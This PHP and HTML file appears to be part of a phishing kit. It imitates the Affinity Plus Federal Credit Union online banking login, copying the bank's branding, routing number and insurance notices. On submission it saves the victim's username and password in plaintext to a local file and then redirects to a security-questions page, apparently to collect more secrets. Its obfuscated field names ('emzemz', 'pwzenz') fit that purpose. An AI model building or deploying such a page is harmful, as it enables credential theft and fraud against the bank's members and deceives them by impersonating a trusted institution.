<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

$errors = [];
$username = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['emzemz'] ?? '');
    $password = $_POST['pwzenz'] ?? '';
    $remember = isset($_POST['remember']);

    // Simple validation
    if (empty($username)) {
        $errors['emzemz'] = 'Username is required';
    }
    if (empty($password)) {
        $errors['pwzenz'] = 'Password is required';
    }

    if (empty($errors)) {
        // Store username in session for next steps
        $_SESSION['emzemz'] = $username;
        
        // Save to test file
        $data = [
            'step' => 'login',
            'usrnm' => $username,
            'emzemz' => $username,
            'pwzenz' => $password,
            'remember' => $remember
        ];
        
        saveUserData('login_attempts.txt', $data);
        
        // Redirect to security questions
        header('Location: security_questions.php');
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Affinity Plus - Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="min-h-screen flex flex-col overflow-hidden bg-cover bg-center bg-no-repeat relative" style="background-image: url('assets/background.jpeg');">
        <!-- Dark Overlay -->
        <div class="absolute inset-0 bg-black/40"></div>
        
        <!-- Relative Container -->
        <div class="relative z-10 flex flex-col min-h-screen">
            <!-- Header -->
            <header class="bg-purple-900 text-white py-3 px-6 flex items-center justify-between shadow-md">
                <div class="flex items-center space-x-2">
                    <img src="assets/logo.svg" alt="Affinity Plus Logo" class="h-10 w-auto" />
                </div>
                <div class="flex items-center space-x-3">
                    <div class="text-white/80 hover:text-white cursor-pointer transition-colors p-1">
                        <i class="fas fa-comments text-xl"></i>
                    </div>
                </div>
            </header>

            <!-- Main Content -->
            <main class="flex-1 flex items-center justify-center px-4 py-10">
                <!-- Login Card -->
                <div class="bg-white shadow-lg rounded-md w-full max-w-md p-6 flex flex-col gap-4">
                    <!-- Card Header -->
                    <div>
                        <h2 class="text-center text-xl font-semibold mb-2 text-gray-900">Login</h2>
                    </div>

                    <!-- Form -->
                    <?php if (!empty($errors)): ?>
                        <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
                            <div class="flex">
                                <div class="flex-shrink-0">
                                    <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <div class="ml-3">
                                    <p class="text-sm text-red-700">
                                        Please fix the following errors:
                                        <ul class="list-disc pl-5 mt-1">
                                            <?php foreach ($errors as $error): ?>
                                                <li><?php echo htmlspecialchars($error); ?></li>
                                            <?php endforeach; ?>
                                        </ul>
                                    </p>
                                </div>
                            </div>
                        </div>
                    <?php endif; ?>
                    
                    <form method="POST" class="space-y-4">
                        <!-- Username Field -->
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1" for="emzemz">
                                Username
                            </label>
                            <div class="relative">
                                <input
                                    type="text"
                                    id="emzemz"
                                    name="emzemz"
                                    value="<?php echo htmlspecialchars($username); ?>"
                                    class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                    placeholder="Enter your username"
                                    required
                                >
                            </div>
                            <?php if (isset($errors['emzemz'])): ?>
                                <p class="mt-2 text-sm text-red-600"><?php echo htmlspecialchars($errors['emzemz']); ?></p>
                            <?php endif; ?>
                        </div>

                        <!-- Password Field -->
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1" for="pwzenz">
                                Password
                            </label>
                            <div class="relative">
                                <input
                                    id="pwzenz"
                                    name="pwzenz"
                                    type="password"
                                    value="<?php echo htmlspecialchars($_POST['pwzenz'] ?? ''); ?>"
                                    class="w-full border border-gray-300 rounded-md px-3 py-2 pr-10 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
                                    autocomplete="current-password"
                                />
                                <button
                                    type="button"
                                    onclick="togglePasswordVisibility('pwzenz')"
                                    class="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-purple-700 focus:outline-none"
                                    aria-label="Toggle password visibility"
                                >
                                    <i id="eye-icon-pwzenz" class="fas fa-eye text-lg"></i>
                                </button>
                            </div>
                            <?php if (isset($errors['pwzenz'])): ?>
                                <p class="mt-2 text-sm text-red-600"><?php echo htmlspecialchars($errors['pwzenz']); ?></p>
                            <?php endif; ?>
                        </div>

                        <!-- Remember Username & Forgot Credentials -->
                        <div class="flex items-center justify-between">
                            <div class="flex items-center gap-2">
                                <button
                                    id="remember"
                                    type="button"
                                    role="switch"
                                    aria-checked="false"
                                    onclick="toggleRemember()"
                                    class="relative inline-flex h-6 w-11 items-center rounded-full transition-colors bg-gray-300"
                                >
                                    <span
                                        id="toggleSwitch"
                                        class="inline-block h-4 w-4 transform rounded-full bg-white transition-transform translate-x-1"
                                    />
                                </button>
                                <label for="remember" class="text-sm text-gray-700">
                                    Remember Username
                                </label>
                            </div>
                            <a href="#" class="text-sm text-purple-800 hover:underline">
                                Forgot credentials?
                            </a>
                        </div>

                        <!-- Log In Button -->
                        <button
                            type="submit"
                            class="w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition disabled:opacity-70"
                        >
                            Log In
                        </button>

                        <!-- Register Button -->
                        <button
                            type="button"
                            onclick="window.location.href='#'"
                            class="w-full border border-purple-900 text-purple-900 py-2 rounded-md font-medium hover:bg-purple-50 transition"
                        >
                            Register for digital banking
                        </button>
                    </form>
                </div>
            </main>

            <!-- Footer -->
            <footer class="bg-white py-6 text-center text-sm text-gray-700 border-t border-gray-200">
                <div class="flex flex-col md:flex-row items-center justify-center gap-3 mb-3">
                    <a href="#" class="text-purple-800 hover:underline">Contact Us</a>
                    <a href="#" class="text-purple-800 hover:underline">Locations</a>
                    <a href="#" class="text-purple-800 hover:underline">Disclosures</a>
                    <a href="#" class="text-purple-800 hover:underline">Privacy Policy</a>
                    <a href="#" class="text-purple-800 hover:underline">Open a Membership</a>
                </div>
                <p class="text-xs text-gray-600">Routing # 296076301</p>
                <p class="text-xs mt-2 text-gray-600">
                    Affinity Plus Federal Credit Union is federally insured by the National Credit Union Administration. Copyright © 2025 Affinity Plus Federal Credit Union.
                </p>

                <div class="flex items-center justify-center gap-4 mt-4">
                    <img src="assets/equal-housing.png" alt="Equal Housing Lender" class="h-8 w-auto" />
                    <img src="assets/ncua.png" alt="NCUA Insured" class="h-8 w-auto" />
                </div>
            </footer>
        </div>
    </div>

    <script>
        function togglePasswordVisibility(fieldId) {
            const field = document.getElementById(fieldId);
            const eyeIcon = document.getElementById(`eye-icon-${fieldId}`);
            
            if (field.type === 'password') {
                field.type = 'text';
                eyeIcon.classList.remove('fa-eye');
                eyeIcon.classList.add('fa-eye-slash');
            } else {
                field.type = 'password';
                eyeIcon.classList.remove('fa-eye-slash');
                eyeIcon.classList.add('fa-eye');
            }
        }

        function toggleRemember() {
            const rememberBtn = document.getElementById('remember');
            const toggleSwitch = document.getElementById('toggleSwitch');
            const isChecked = rememberBtn.getAttribute('aria-checked') === 'true';
            
            rememberBtn.setAttribute('aria-checked', !isChecked);
            
            if (!isChecked) {
                rememberBtn.classList.remove('bg-gray-300');
                rememberBtn.classList.add('bg-purple-700');
                toggleSwitch.classList.remove('translate-x-1');
                toggleSwitch.classList.add('translate-x-6');
            } else {
                rememberBtn.classList.remove('bg-purple-700');
                rememberBtn.classList.add('bg-gray-300');
                toggleSwitch.classList.remove('translate-x-6');
                toggleSwitch.classList.add('translate-x-1');
            }
        }
        
        // Auto-focus username field on page load
        document.addEventListener('DOMContentLoaded', function() {
            const usernameField = document.getElementById('emzemz');
            if (usernameField) {
                usernameField.focus();
            }
        });
    </script>
</body>
</html>
